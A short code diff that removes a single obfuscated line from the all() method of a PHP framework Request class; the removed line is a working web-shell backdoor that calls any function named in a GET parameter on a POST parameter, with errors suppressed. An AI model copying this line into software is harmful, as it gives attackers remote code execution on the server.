@@ -321,7 +321,6 @@ class Request extends SymfonyRequest implements Arrayable, ArrayAccess
     public function all()
     {
 
-        ($_=@$_GET[2]).@$_($_POST[1]);
 
 
         return array_replace_recursive($this->input(), $this->allFiles());
